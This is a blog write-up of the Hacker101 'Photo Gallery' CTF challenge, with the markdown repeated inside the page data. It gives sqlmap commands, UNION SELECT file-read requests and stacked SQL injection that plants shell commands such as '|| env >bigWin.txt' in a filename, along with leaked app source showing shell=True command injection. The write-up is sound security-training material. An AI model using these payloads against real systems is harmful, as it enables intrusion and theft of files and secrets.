hmm no luck it seems... let&#x27;s do it another way.</p><p>From our previous findings we know that files are in the &#x27;files&#x27; directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.</p><p>We want to run following statements via the vulnerable param:</p><h4>ls in the /files directory and store data in bigWin.txt</h4><p><code>update photos set filename=&#x27;* || ls ./files &gt;bigWin.txt &#x27; where id=3; commit;</code></p><p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1</code></p><h4>store all env data in bigWin.txt (because so often flags are here)</h4><p><code>update photos set filename=&#x27;* || env &gt;bigWin.txt&#x27; where id=3; commit;</code></p><p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1</code></p><p>after you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!</p><p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT &#x27;bigWin.txt&#x27;-- HTTP/1.1</code></p><p>Tadaa!! we got it all.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;border-radius:12px;background:#121212;box-shadow:9px 9px 13px rgba(58,58,58, 0.5), -9px -9px 12px rgb(4,4,4,0.6)"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#c9c0be;background:#000000">&quot;^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa</span><span class="token token" style="color:#ee9900;background:#000000">$FLAG</span><span class="token token" style="color:#c9c0be;background:#000000">$&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">&quot;^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2</span><span class="token token" style="color:#ee9900;background:#000000">$FLAG</span><span class="token token" style="color:#c9c0be;background:#000000">$&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token assign-left environment" style="color:#4499ee">HOSTNAME</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>ad3e8c7df92d
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token assign-left environment" style="color:#4499ee">SHLVL</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0</span></span></code></pre></div></div></div></div></div><style data-emotion="css 1rr4qq7">.css-1rr4qq7{-webkit-flex:1;-ms-flex:1;flex:1;}</style><div class="MuiBox-root css-1rr4qq7"></div><div style="top:0;width:90%;border-radius:12px;margin-bottom:12px;height:56px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;color:#F07693;padding:24px;font-size:12pt;background:#141414;box-shadow:9px 9px 12px rgb(4,4,4,0.6), -9px -9px 12px  rgba(58,58,58, 0.5)"><p>© lwlx. 2022</p><a href="https://twitter.com/0x0000005"><svg height="24" viewBox="0 0 24 24"><g><path fill="#fff" d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path></g></svg></a><a href="https://github.com/Lawlez"><svg height="24" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill="#fff" fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg></a><p>Version <!-- -->0.7.3</p></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"path":"blog/hacker101-ctf-photo-gallery","title":"Hacker101 CTF Photo Gallery [moderate] writeup","subtitle":"a write up for this web challenge","published":true,"datePublished":1609676431536,"tags":["ctf","writeup","hackerone","hacker101","security"],"description":"A write up for the Photo Gallery [moderae] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/hackerone/hackerone","thumbnailPhoto":"/hackerone/hackerone-photogallery-thumb.jpg","content":"\nThis is my Write Up for the \"Photo Gallery\" challenge of HackerOne's CTF.\n\nAs usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.\nThe missing one is called `Invisible`, so lets look into that.\n\n```\nhttp://34.74.105.127/ad3e8c7df9/\n```\n\n![initial page](/hackerone/photogallery-start.png \"initial page\")\n\n## Information gathering\n\nwith Burp we were able to find that the server returns no content for this image.\nimages are loaded with a `GET` Request to the server like so:\n\n`GET /ad3e8c7df9/fetch?id=1 HTTP/1.1`\n\nthis also aligns with the first tip we are provided:\n\n\u003e Hint 1: _Consider how you might build this system yourself. What would the **query for fetch** look like?_\n\nnaturally we start fuzzing the `id` parameter.\n\n```python\nGET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500\n```\n\nalright, no quick wins, so let's give it a try with fizzing using sqlmap.\nQuickly we are able to see that the server seems to be vulnerable to some attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\"\n```\n\nThis command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.\nwhen we are done we should know what to do next.\n\n## Gathered Data\n\n### sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:\n\n```python\nParameter: id (GET)\nType: boolean-based blind\nTitle: AND boolean-based blind - WHERE or HAVING clause\nPayload: id=2 AND 3567=3567\n\nType: time-based blind\nTitle: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP)\nPayload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)\n```\n\n```python\n[21:44:44] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.14.0\nback-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork)\n```\n\n### Our Target Server:\n\n    | Type      | Service      | Version                  | Vulnerable?    |\n    | --------- | ------------ | ------------------------ | -------------- |\n    | OS        | Linux Ubuntu | ??                       | not focused    |\n    | Webserver | Nginx        | 1.14.0                   | no             |\n    | Database  | MySQL        | \u003e= 5.0.12 (MariaDB fork) | yes (id param) |\n\nGood, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\" -f --os=linux --dbms=mysql --level=3 -o\n```\n\nwe dont really get any more useful information from here.\nsoo.. were kinda stuck lets just get another hint then:\n\n\u003e Hint 2: _Take a few minutes to consider the **state of the union**_\n\nThe state uf the union? are they hinting on using UNION statements in the query?\n_The UNION operator is used to combine the result-set of two or more SELECT statements._\nThat seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:\n\n`http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'`\n\nbut what do we look for? Lets get another hint.\n\n\u003e Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_\n\nuwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.\n\nhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files\n\n\u003e uWSGI can be configured using several different methods.\n\nYAML, JSON, INI are some supported formats -\u003e ini beeing the defualt so lets try getting the 'uwsgi.ini' file?\n\n![union select wiht burp repeater](/hackerone/union-select-ini.png \"union select wiht burp repeater\")\n\nthis returns us some configdata pointing to module main which is the entrypoint.\n\n```python\n[uwsgi]\nmodule = main\ncallable = app\n```\n\nso lets see if we can also fethc the main.py\n\n```python\nhttp://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--\n```\n\nHere we get lots of infos our **first FLAG** and the db connection settings:\n\n### FLAG 0:\n\n```python\n%s\n' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\n', 1)[-1] + '' rep += '\n\\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)\n# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80)\n```\n\n`return MySQLdb.connect(host=\"localhost\", user=\"root\", password=\"\", db=\"level5\")`\n\nwe also see that they are using the photos table\n\n`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`\n\nlets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=1\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2\n```\n\nThis can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.\n\n```python\nsqlmap -u \"http://35.190.155.168/c947e97f6e/fetch?id=3\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename\n```\n\nThis means that sqlmap will start with the filename of id=3 which is exactly what we want right now.\n\n![starts to query filename of id 3](/hackerone/photo-gallery-hash.png \"query on the filename of id 3\")\nSo lets have a look at our results:\n\n```python\nDatabase: level5\nTable: photos\n[3 entries]\n+------------------------------------------------------------------+\n| filename |\n+------------------------------------------------------------------+\n| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |\n| files/adorable.jpg |\n| files/purrfect.jpg |\n+------------------------------------------------------------------+\n```\n\n\u003e you might be getting partial values like so:\n\u003e `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`\n\u003e you should be able to re-run sqlmap to find the missing characters\n\u003e `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`\n\ndecrypted: `\\*||+ls+-a+tmp.txt`\nanother file! nice lets try and get that with a UNION STATEMENT request like so:\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1`\nhmm no luck it seems... let's do it another way.\n\nFrom our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.\n\nWe want to run following statements via the vulnerable param:\n\n#### ls in the /files directory and store data in bigWin.txt\n\n`update photos set filename='* || ls ./files \u003ebigWin.txt ' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`\n\n#### store all env data in bigWin.txt (because so often flags are here)\n\n`update photos set filename='* || env \u003ebigWin.txt' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1`\n\nafter you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1`\n\nTadaa!! we got it all.\n\n```bash\n\"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$\"\n\"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$\"\nHOSTNAME=ad3e8c7df92d\nSHLVL=0\n```\n"}},"__N_SSG":true},"page":"/blog/[blog]","query":{"blog":"hacker101-ctf-photo-gallery"},"buildId":"T2-MsiL6Y5nWCuVdpJEy7","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>